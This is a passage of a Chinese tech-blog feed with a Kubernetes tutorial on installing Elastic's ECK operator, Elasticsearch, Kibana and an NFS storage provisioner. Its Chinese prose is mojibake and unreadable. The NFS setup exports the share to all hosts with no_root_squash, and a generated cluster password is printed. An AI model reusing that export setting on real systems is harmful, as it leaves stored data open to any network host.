éœ€å¼€å‘å¿ƒè·³æ£€æµ‹ã€èµ„æºé‡å»ºç­‰é€šç”¨é€»è¾‘</td></tr><tr><td><strong>å°åŒ…é«˜é¢‘ï¼ˆå¸¦å®½æœ‰é™ï¼‰</strong></td><td>â€¢Â <strong>æç®€åè®®å¤´</strong>ï¼šæœ€å°2å­—èŠ‚ï¼ˆvs AMQP/Kafkaçš„KBçº§ï¼‰ â€¢Â <strong>æ¶ˆæ¯åˆå¹¶</strong>ï¼šå•æ¬¡TCPå‘é€å¤šä¸ªæ¶ˆæ¯</td><td>â€¢ å›ºå®šåè®®å¤´å¤§ï¼ˆå¦‚Kafkaæ¯æ¡æ¶ˆæ¯å›ºå®šå…ƒæ•°æ®ï¼‰ â€¢ å¤šæ¶ˆæ¯éœ€æ‰¹é‡ï¼ˆå¦‚Kafka Producerçš„<code>batch.size</code>ï¼‰</td><td>åœ¨4G/WiFiæ··åˆç½‘ç»œä¸­ï¼ŒMQTTçš„<strong>å°æ•°æ®åŒ…</strong>é™ä½æµé‡æ¶ˆè€—ï¼ŒJavaä¸šåŠ¡å±‚æ— éœ€æ‰‹åŠ¨ä¼˜åŒ–</td></tr><tr><td><strong>æœåŠ¡ç«¯å‹åŠ›å¤§ï¼ˆæµ·é‡å¼±ç½‘è®¾å¤‡ï¼‰</strong></td><td>â€¢Â <strong>Brokeråˆ†å±‚é›†ç¾¤</strong>ï¼šEMQXæ”¯æŒç™¾ä¸‡çº§è¿æ¥ â€¢Â <strong>ä½å¿ƒè·³é¢‘ç‡</strong>ï¼šæ”¯æŒ90-120ç§’é•¿å¿ƒè·³é—´éš”</td><td>â€¢ å¤§é‡é•¿è¿æ¥æ¶ˆè€—å†…å­˜ï¼ˆå¦‚Kafkaå•è¿æ¥éœ€2MBï¼‰ â€¢ å¿«é€Ÿé‡è¿å¯¼è‡´è´Ÿè½½å³°å€¼ï¼ˆå¦‚RabbitMQçš„TCPæ´ªæ°´ï¼‰</td><td>JavaæœåŠ¡å¯é€šè¿‡<strong>æ¨ªå‘æ‰©å±•MQTT Broker</strong>åº”å¯¹è®¾å¤‡æš´å¢ï¼Œè€Œä¼ ç»ŸMQéœ€é¢„å…ˆè®¡ç®—åˆ†åŒº/é˜Ÿåˆ—æ•°é‡ï¼Œå¼¹æ€§ä¸è¶³</td></tr><tr><td><strong>å¼±ç½‘é˜»å¡ï¼ˆæ¶ˆæ¯ç§¯å‹ï¼‰</strong></td><td>â€¢Â <strong>Max Inflighté™åˆ¶</strong>ï¼šæ§åˆ¶å•å®¢æˆ·ç«¯æœªACKæ¶ˆæ¯æ•°ï¼ˆé»˜è®¤20ï¼‰ â€¢Â <strong>Backoffç­–ç•¥</strong>ï¼šè‡ªåŠ¨é€€é¿é‡ä¼ ï¼ˆå¦‚60ç§’ï¼‰</td><td>â€¢ éœ€æ‰‹åŠ¨é…ç½®æ¶ˆè´¹è€…é™æµï¼ˆå¦‚RabbitMQçš„<code>prefetch_count</code>ï¼‰ â€¢ ç§¯å‹åéœ€ç›‘æ§Consumer Lagï¼ˆå¦‚Kafkaçš„JMXï¼‰</td><td>é€šè¿‡<code>setMaxInflight(50)</code>ç­‰å‚æ•°ï¼ŒJavaå¼€å‘è€…<strong>ä¸€é”®æ§åˆ¶å¼±ç½‘ä¸‹çš„å†…å­˜å ç”¨</strong>ï¼Œæ— éœ€è‡ªå·±å®ç°æ¶ˆæ¯å †ç§¯å¤„ç†é€»è¾‘</td></tr><tr><td><strong>å®‰å…¨æ¡æ‰‹å¤±è´¥ï¼ˆé«˜å»¶è¿ŸSSLï¼‰</strong></td><td>â€¢Â <strong>TLSä¼šè¯å¤ç”¨</strong>ï¼šå‡å°‘æ¡æ‰‹æ¬¡æ•° â€¢Â <strong>å¼±ç½‘ä¼˜åŒ–Cipher</strong>ï¼šæ”¯æŒä½è®¡ç®—é‡ç®—æ³•ï¼ˆå¦‚<code>TLS_PSK</code>ï¼‰</td><td>â€¢ å®Œæ•´SSLæ¡æ‰‹è€—æ—¶1-2ç§’ï¼ˆé«˜å»¶è¿Ÿä¸‹æ˜“å¤±è´¥ï¼‰ â€¢ éœ€æ‰‹åŠ¨è°ƒæ•´SSLå‚æ•°ï¼ˆå¦‚Kafkaçš„<code>ssl.enabled.protocols</code>ï¼‰</td><td>MQTTçš„<strong>è½»é‡çº§åŠ å¯†</strong>é€‚åº”å¼±ç½‘ï¼ŒJavaä»£ç ä¸­ä»…éœ€é…ç½®<code>SSLContext</code>ï¼Œæ— éœ€é¢å¤–ä¼˜åŒ–</td></tr></tbody></table>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[K8S ä¸­ä½¿ç”¨ YAML å®‰è£… ECK]]></title>    <link>https://juejin.cn/post/7582769411994583092</link>    <guid>https://juejin.cn/post/7582769411994583092</guid>    <pubDate>2025-12-12T14:53:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582769411994583092" data-draft-id="7582776967818100736" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="K8S ä¸­ä½¿ç”¨ YAML å®‰è£… ECK"/> <meta itemprop="keywords" content="Elasticsearch,Kubernetes"/> <meta itemprop="datePublished" content="2025-12-12T14:53:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°é™ˆè¿ç»´"/> <meta itemprop="url" content="https://juejin.cn/user/3315782802482007"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            K8S ä¸­ä½¿ç”¨ YAML å®‰è£… ECK
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3315782802482007/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°é™ˆè¿ç»´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-12T14:53:37.000Z" title="Fri Dec 12 2025 14:53:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">K8S ä¸­ä½¿ç”¨ YAML å®‰è£… ECK</h2>
<p>Kubernetes æ˜¯ç›®å‰æœ€å—æ¬¢è¿çš„å®¹å™¨ç¼–æ’æŠ€æœ¯ï¼Œè¶Šæ¥è¶Šå¤šçš„åº”ç”¨å¼€å§‹å¾€ Kubernetes ä¸­è¿ç§»ã€‚Kubernetes ç°æœ‰çš„ ReplicaSetã€Deploymentã€Service ç­‰èµ„æºå¯¹è±¡å·²ç»å¯ä»¥æ»¡è¶³æ— çŠ¶æ€åº”ç”¨å¯¹äºè‡ªåŠ¨æ‰©ç¼©å®¹ã€è´Ÿè½½å‡è¡¡ç­‰åŸºæœ¬éœ€æ±‚ã€‚ä½†æ˜¯å¯¹äºæœ‰çŠ¶æ€çš„ã€åˆ†å¸ƒå¼çš„åº”ç”¨ï¼Œé€šå¸¸æ‹¥æœ‰å„è‡ªçš„ä¸€å¥—æ¨¡å‹å®šä¹‰è§„èŒƒï¼Œä¾‹å¦‚ Prometheusï¼ŒEtcdï¼ŒZookeeperï¼ŒElasticsearch ç­‰ç­‰ã€‚éƒ¨ç½²è¿™äº›åˆ†å¸ƒå¼åº”ç”¨å¾€å¾€éœ€è¦ç†Ÿæ‚‰ç‰¹å®šé¢†åŸŸçš„çŸ¥è¯†ï¼Œå¹¶ä¸”åœ¨æ‰©ç¼©å®¹å’Œå‡çº§æ—¶éœ€è¦è€ƒè™‘å¦‚ä½•ä¿è¯åº”ç”¨æœåŠ¡çš„å¯ç”¨æ€§ç­‰é—®é¢˜ã€‚ä¸ºäº†ç®€åŒ–æœ‰çŠ¶æ€ã€åˆ†å¸ƒå¼åº”ç”¨çš„éƒ¨ç½²ï¼ŒKubernetes Operator åº”è¿è€Œç”Ÿã€‚</p>
<p>Kubernetes Operator æ˜¯ä¸€ç§ç‰¹å®šçš„åº”ç”¨æ§åˆ¶å™¨ï¼Œé€šè¿‡ CRDï¼ˆCustom Resource Definitionsï¼Œè‡ªå®šä¹‰èµ„æºå®šä¹‰ï¼‰æ‰©å±• Kubernetes API çš„åŠŸèƒ½ï¼Œå¯ä»¥ç”¨å®ƒæ¥åˆ›å»ºã€é…ç½®å’Œç®¡ç†ç‰¹å®šçš„æœ‰çŠ¶æ€åº”ç”¨ï¼Œè€Œä¸éœ€è¦ç›´æ¥å»ä½¿ç”¨ Kubernetes ä¸­æœ€åŸå§‹çš„ä¸€äº›èµ„æºå¯¹è±¡ï¼Œæ¯”å¦‚ Podï¼ŒDeploymentï¼ŒService ç­‰ç­‰ã€‚</p>
<p>Elastic Cloud on Kubernetesï¼ˆECKï¼‰ æ˜¯å…¶ä¸­çš„ä¸€ç§ Kubernetes Operatorï¼Œæ–¹ä¾¿æˆ‘ä»¬ç®¡ç† Elastic Stack å®¶æ—ä¸­çš„å„ç§ç»„ä»¶ï¼Œä¾‹å¦‚ Elasticsearchï¼ŒKibanaï¼ŒAPMï¼ŒBeats ç­‰ç­‰ã€‚æ¯”å¦‚åªéœ€è¦å®šä¹‰ä¸€ä¸ª Elasticsearch ç±»å‹çš„ CRD å¯¹è±¡ï¼ŒECK å°±å¯ä»¥å¸®åŠ©æˆ‘ä»¬å¿«é€Ÿæ­å»ºå‡ºä¸€å¥— Elasticsearch é›†ç¾¤ã€‚</p>
<h3 data-id="heading-1">ä½¿ç”¨createå®‰è£…Elasticçš„è‡ªå®šä¹‰èµ„æºå®šä¹‰</h3>
<pre><code class="hljs language-shell" lang="shell">[root@k8s-192-168-1-140 ~]# kubectl create -f https://download.elastic.co/downloads/eck/3.2.0/crds.yaml
customresourcedefinition.apiextensions.k8s.io/agents.agent.k8s.elastic.co created
customresourcedefinition.apiextensions.k8s.io/apmservers.apm.k8s.elastic.co created
customresourcedefinition.apiextensions.k8s.io/beats.beat.k8s.elastic.co created
customresourcedefinition.apiextensions.k8s.io/elasticmapsservers.maps.k8s.elastic.co created
customresourcedefinition.apiextensions.k8s.io/elasticsearchautoscalers.autoscaling.k8s.elastic.co created
customresourcedefinition.apiextensions.k8s.io/elasticsearches.elasticsearch.k8s.elastic.co created
customresourcedefinition.apiextensions.k8s.io/enterprisesearches.enterprisesearch.k8s.elastic.co created
customresourcedefinition.apiextensions.k8s.io/kibanas.kibana.k8s.elastic.co created
customresourcedefinition.apiextensions.k8s.io/logstashes.logstash.k8s.elastic.co created
customresourcedefinition.apiextensions.k8s.io/stackconfigpolicies.stackconfigpolicy.k8s.elastic.co created
[root@k8s-192-168-1-140 ~]# 
</code></pre>
<h3 data-id="heading-2">ä½¿ç”¨kubectl apply å®‰è£…operatoråŠå…¶RBACè§„åˆ™</h3>
<pre><code class="hljs language-shell" lang="shell">[root@k8s-192-168-1-140 ~]# kubectl apply -f https://download.elastic.co/downloads/eck/3.2.0/operator.yaml
namespace/elastic-system created
serviceaccount/elastic-operator created
secret/elastic-webhook-server-cert created
configmap/elastic-operator created
clusterrole.rbac.authorization.k8s.io/elastic-operator created
clusterrole.rbac.authorization.k8s.io/elastic-operator-view created
clusterrole.rbac.authorization.k8s.io/elastic-operator-edit created
clusterrolebinding.rbac.authorization.k8s.io/elastic-operator created
service/elastic-webhook-server created
statefulset.apps/elastic-operator created
validatingwebhookconfiguration.admissionregistration.k8s.io/elastic-webhook.k8s.elastic.co created
[root@k8s-192-168-1-140 ~]# 
</code></pre>
<h3 data-id="heading-3">æŸ¥çœ‹æ˜¯å¦å¯åŠ¨å®Œæˆ</h3>
<pre><code class="hljs language-shell" lang="shell">[root@k8s-192-168-1-140 ~]kubectl get -n elastic-system pods
NAME                 READY   STATUS    RESTARTS   AGE
elastic-operator-0   1/1     Running   0          8m38s
[root@k8s-192-168-1-140 ~]# 
</code></pre>
<h3 data-id="heading-4">å¯åŠ¨éƒ¨ç½²</h3>
<p>Operatorè‡ªåŠ¨åˆ›å»ºå’Œç®¡ç†Kubernetesèµ„æºï¼Œä»¥å®ç°Elasticsearché›†ç¾¤çš„æœŸæœ›çŠ¶æ€ã€‚å¯èƒ½éœ€è¦å‡ åˆ†é’Ÿçš„æ—¶é—´æ‰èƒ½åˆ›å»ºæ‰€æœ‰èµ„æºå¹¶å‡†å¤‡å¥½ä½¿ç”¨ç¾¤é›†ã€‚</p>
<pre><code class="hljs language-shell" lang="shell">cat &lt;&lt;EOF | kubectl apply -f -
apiVersion: elasticsearch.k8s.elastic.co/v1
kind: Elasticsearch
metadata:
  name: quickstart
spec:
  version: 9.2.2
  nodeSets:
  - name: default
    count: 1
    config:
      node.store.allow_mmap: false
EOF
</code></pre>
<h3 data-id="heading-5">å­˜å‚¨ç”¨é‡</h3>
<p>åˆ›å»ºæ—¶é»˜è®¤ä¸º1Gå­˜å‚¨ç©ºé—´ï¼Œå¯ä»¥åœ¨åˆ›å»ºæ—¶é…ç½®ç”³æ˜ç©ºé—´</p>
<pre><code class="hljs language-shell" lang="shell">cat &lt;&lt;EOF | kubectl apply -f -
apiVersion: elasticsearch.k8s.elastic.co/v1
kind: Elasticsearch
metadata:
  name: quickstart
spec:
  version: 9.2.2
  nodeSets:
  - name: default
    count: 1
    volumeClaimTemplates:
    - metadata:
        name: elasticsearch-data
      spec:
        accessModes:
        - ReadWriteOnce
        resources:
          requests:
            storage: 5Gi
        storageClassName: nfs-storage
    config:
      node.store.allow_mmap: false
EOF
</code></pre>
<h3 data-id="heading-6">æŸ¥çœ‹éƒ¨ç½²çŠ¶æ€</h3>
<pre><code class="hljs language-shell" lang="shell">[root@k8s-192-168-1-140 ~]# 
[root@k8s-192-168-1-140 ~]# kubectl get pod -A
NAMESPACE        NAME                                       READY   STATUS    RESTARTS            AGE
default          nginx-66686b6766-tdwt2                     1/1     Running   2 (&lt;invalid&gt; ago)   81d
default          quickstart-es-default-0                    0/1     Pending   0                   2m1s
elastic-system   elastic-operator-0                         1/1     Running   0                   12m
kube-system      calico-kube-controllers-78dcb7b647-8f2ph   1/1     Running   2 (&lt;invalid&gt; ago)   81d
kube-system      calico-node-hpwvr                          1/1     Running   2 (&lt;invalid&gt; ago)   81d
kube-system      coredns-6746f4cb74-bhkv8                   1/1     Running   2 (&lt;invalid&gt; ago)   81d
kube-system      metrics-server-55c56cb875-bwbpr            1/1     Running   2 (&lt;invalid&gt; ago)   81d
kube-system      node-local-dns-nz4q7                       1/1     Running   2 (&lt;invalid&gt; ago)   81d
[root@k8s-192-168-1-140 ~]# 
</code></pre>
<h3 data-id="heading-7">æŸ¥çœ‹æ—¥å¿—</h3>
<pre><code class="hljs language-shell" lang="shell">[root@k8s-192-168-1-140 ~]# kubectl logs -f quickstart-es-default-0
Defaulted container "elasticsearch" out of: elasticsearch, elastic-internal-init-filesystem (init), elastic-internal-suspend (init)
[root@k8s-192-168-1-140 ~]# 
</code></pre>
<h3 data-id="heading-8">å®‰è£…NFSåŠ¨æ€æŒ‚è½½</h3>
<pre><code class="hljs language-shell" lang="shell">[root@k8s-192-168-1-140 ~]# yum  install  nfs-utils -y
[root@k8s-192-168-1-140 ~]# mkdir /nfs
[root@k8s-192-168-1-140 ~]#  vim /etc/exports
/nfs *(rw,sync,no_root_squash,no_subtree_check)

[root@k8s-192-168-1-140 ~]# systemctl restart rpcbind
[root@k8s-192-168-1-140 ~]# systemctl restart nfs-server
[root@k8s-192-168-1-140 ~]# systemctl  enable  rpcbind
[root@k8s-192-168-1-140 ~]# systemctl  enable  nfs-server
</code></pre>
<h3 data-id="heading-9">K8S ç¼–å†™NFSä¾›ç»™</h3>
<pre><code class="hljs language-shell" lang="shell">[root@k8s-192-168-1-140 ~]#  vim nfs-storage.yaml
[root@k8s-192-168-1-140 ~]# 
[root@k8s-192-168-1-140 ~]#  cat nfs-storage.yaml
apiVersion: storage.k8s.io/v1
kind: StorageClass
metadata:
  name: nfs-storage
  annotations:
    storageclass.kubernetes.io/is-default-class: "true"
provisioner: k8s-sigs.io/nfs-subdir-external-provisioner
parameters:
  archiveOnDelete: "true"  ## åˆ é™¤pvçš„æ—¶å€™ï¼Œpvçš„å†…å®¹æ˜¯å¦è¦å¤‡ä»½


---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: nfs-client-provisioner
  labels:
    app: nfs-client-provisioner
<span class="hljs-meta prompt_">  # </span><span class="bash">replace with namespace <span class="hljs-built_in">where</span> provisioner is deployed</span>
  namespace: default
spec:
  replicas: 1
  strategy:
    type: Recreate
  selector:
    matchLabels:
      app: nfs-client-provisioner
  template:
    metadata:
      labels:
        app: nfs-client-provisioner
    spec:
      serviceAccountName: nfs-client-provisioner
      containers:
        - name: nfs-client-provisioner
          image: registry.cn-hangzhou.aliyuncs.com/chenby/nfs-subdir-external-provisioner:v4.0.2
          # resources:
          #    limits:
          #      cpu: 10m
          #    requests:
          #      cpu: 10m
          volumeMounts:
            - name: nfs-client-root
              mountPath: /persistentvolumes
          env:
            - name: PROVISIONER_NAME
              value: k8s-sigs.io/nfs-subdir-external-provisioner
            - name: NFS_SERVER
              value: 192.168.1.140 ## æŒ‡å®šè‡ªå·±nfsæœåŠ¡å™¨åœ°å€
            - name: NFS_PATH  
              value: /nfs/  ## nfsæœåŠ¡å™¨å…±äº«çš„ç›®å½•
      volumes:
        - name: nfs-client-root
          nfs:
            server: 192.168.1.140
            path: /nfs/
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: nfs-client-provisioner
<span class="hljs-meta prompt_">  # </span><span class="bash">replace with namespace <span class="hljs-built_in">where</span> provisioner is deployed</span>
  namespace: default
---
kind: ClusterRole
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: nfs-client-provisioner-runner
rules:
  - apiGroups: [""]
    resources: ["nodes"]
    verbs: ["get", "list", "watch"]
  - apiGroups: [""]
    resources: ["persistentvolumes"]
    verbs: ["get", "list", "watch", "create", "delete"]
  - apiGroups: [""]
    resources: ["persistentvolumeclaims"]
    verbs: ["get", "list", "watch", "update"]
  - apiGroups: ["storage.k8s.io"]
    resources: ["storageclasses"]
    verbs: ["get", "list", "watch"]
  - apiGroups: [""]
    resources: ["events"]
    verbs: ["create", "update", "patch"]
---
kind: ClusterRoleBinding
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: run-nfs-client-provisioner
subjects:
  - kind: ServiceAccount
    name: nfs-client-provisioner
    # replace with namespace where provisioner is deployed
    namespace: default
roleRef:
  kind: ClusterRole
  name: nfs-client-provisioner-runner
  apiGroup: rbac.authorization.k8s.io
---
kind: Role
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: leader-locking-nfs-client-provisioner
<span class="hljs-meta prompt_">  # </span><span class="bash">replace with namespace <span class="hljs-built_in">where</span> provisioner is deployed</span>
  namespace: default
rules:
  - apiGroups: [""]
    resources: ["endpoints"]
    verbs: ["get", "list", "watch", "create", "update", "patch"]
---
kind: RoleBinding
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: leader-locking-nfs-client-provisioner
<span class="hljs-meta prompt_">  # </span><span class="bash">replace with namespace <span class="hljs-built_in">where</span> provisioner is deployed</span>
  namespace: default
subjects:
  - kind: ServiceAccount
    name: nfs-client-provisioner
    # replace with namespace where provisioner is deployed
    namespace: default
roleRef:
  kind: Role
  name: leader-locking-nfs-client-provisioner
  apiGroup: rbac.authorization.k8s.io
</code></pre>
<h3 data-id="heading-10">å¼€å§‹å®‰è£…</h3>
<pre><code class="hljs language-shell" lang="shell">[root@k8s-192-168-1-140 ~]#  kubectl apply -f nfs-storage.yaml
storageclass.storage.k8s.io/nfs-storage created
deployment.apps/nfs-client-provisioner created
serviceaccount/nfs-client-provisioner created
clusterrole.rbac.authorization.k8s.io/nfs-client-provisioner-runner created
clusterrolebinding.rbac.authorization.k8s.io/run-nfs-client-provisioner created
role.rbac.authorization.k8s.io/leader-locking-nfs-client-provisioner created
rolebinding.rbac.authorization.k8s.io/leader-locking-nfs-client-provisioner created
[root@k8s-192-168-1-140 ~]# 
</code></pre>
<h3 data-id="heading-11">æŸ¥çœ‹å­˜å‚¨</h3>
<pre><code class="hljs language-shell" lang="shell">[root@k8s-192-168-1-140 ~]# kubectl get storageclasses.storage.k8s.io
NAME                    PROVISIONER                                   RECLAIMPOLICY   VOLUMEBINDINGMODE   ALLOWVOLUMEEXPANSION   AGE
nfs-storage (default)   k8s-sigs.io/nfs-subdir-external-provisioner   Delete          Immediate           false                  6h7m
[root@k8s-192-168-1-140 ~]# 

[root@k8s-192-168-1-140 ~]# kubectl get pvc
NAME                                         STATUS   VOLUME                                     CAPACITY   ACCESS MODES   STORAGECLASS   VOLUMEATTRIBUTESCLASS   AGE
elasticsearch-data-quickstart-es-default-0   Bound    pvc-2df832aa-1c54-4af6-8384-5e5c5f167445   5Gi        RWO            nfs-storage    &lt;unset&gt;                 39s
[root@k8s-192-168-1-140 ~]# 

[root@k8s-192-168-1-140 ~]# kubectl get pv
NAME                                       CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM                                                STORAGECLASS   VOLUMEATTRIBUTESCLASS   REASON   AGE
pvc-2df832aa-1c54-4af6-8384-5e5c5f167445   5Gi        RWO            Delete           Bound    default/elasticsearch-data-quickstart-es-default-0   nfs-storage    &lt;unset&gt;                          43s
[root@k8s-192-168-1-140 ~]# 
</code></pre>
<h3 data-id="heading-12">æŸ¥çœ‹ESæœåŠ¡å‘ç°</h3>
<pre><code class="hljs language-shell" lang="shell">[root@k8s-192-168-1-140 ~]# kubectl get service
NAME                          TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)        AGE
kubernetes                    ClusterIP   10.68.0.1      &lt;none&gt;        443/TCP        81d
nginx                         NodePort    10.68.148.53   &lt;none&gt;        80:30330/TCP   81d
quickstart-es-default         ClusterIP   None           &lt;none&gt;        9200/TCP       74s
quickstart-es-http            ClusterIP   10.68.66.232   &lt;none&gt;        9200/TCP       75s
quickstart-es-internal-http   ClusterIP   10.68.121.73   &lt;none&gt;        9200/TCP       75s
quickstart-es-transport       ClusterIP   None           &lt;none&gt;        9300/TCP       75s
[root@k8s-192-168-1-140 ~]# 
</code></pre>
<h3 data-id="heading-13">æŸ¥çœ‹ESå¯†ç </h3>
<pre><code class="hljs language-shell" lang="shell">[root@k8s-192-168-1-140 ~]# PASSWORD=$(kubectl get secret quickstart-es-elastic-user -o go-template='{{.data.elastic | base64decode}}')
[root@k8s-192-168-1-140 ~]# 
[root@k8s-192-168-1-140 ~]# kubectl get secret quickstart-es-elastic-user -o go-template='{{.data.elastic | base64decode}}'
V3VPqwQMURTSg6zFYvVIsH13[root@k8s-192-168-1-140 ~]# 
[root@k8s-192-168-1-140 ~]# 
[root@k8s-192-168-1-140 ~]# curl -u "elastic:$PASSWORD" -k "https://10.68.66.232:9200"
{
  "name" : "quickstart-es-default-0",
  "cluster_name" : "quickstart",
  "cluster_uuid" : "JNqGubnmSeao_LO-JmypHg",
  "version" : {
    "number" : "9.2.2",
    "build_flavor" : "default",
    "build_type" : "docker",
    "build_hash" : "ed771e6976fac1a085affabd45433234a4babeaf",
    "build_date" : "2025-11-27T08:06:51.614397514Z",
    "build_snapshot" : false,
    "lucene_version" : "10.3.2",
    "minimum_wire_compatibility_version" : "8.19.0",
    "minimum_index_compatibility_version" : "8.0.0"
  },
  "tagline" : "You Know, for Search"
}
[root@k8s-192-168-1-140 ~]# 
</code></pre>
<h3 data-id="heading-14">å®‰è£…KibanaæœåŠ¡</h3>
<pre><code class="hljs language-shell" lang="shell">cat &lt;&lt;EOF | kubectl apply -f -
apiVersion: kibana.k8s.elastic.co/v1
kind: Kibana
metadata:
  name: quickstart
spec:
  version: 9.2.2
  count: 1
  elasticsearchRef:
    name: quickstart
EOF
</code></pre>
